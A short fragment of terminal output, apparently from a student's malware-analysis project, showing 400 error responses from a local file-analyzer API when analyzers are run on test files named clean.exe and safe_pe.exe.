+  Capa_Info on clean.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nCapa_Info won't be run because does not support the file mimetype."]}}. Details: None
+  Flare_Capa on clean.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'analyzers_requested': ['Object with name=Flare_Capa does not exist.']}}. Details: None
+  Signature_Info on clean.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nSignature_Info won't be run because does not support the file mimetype."]}}. Details: None
+  PE_Info on safe_pe.exe: 400 Client Error: Bad Request for url: http://localhost/api/analyze_file. Details: {'errors': {'detail': ["No Analyzers and Connectors can be run after filtering:\nPE_Info won't be run because does not support the file mimetype."]}}. Details: None
+(venv) anonymous@anonymous-weapon:~/COLLEGE/ThreatFlow/testing_responses$ 
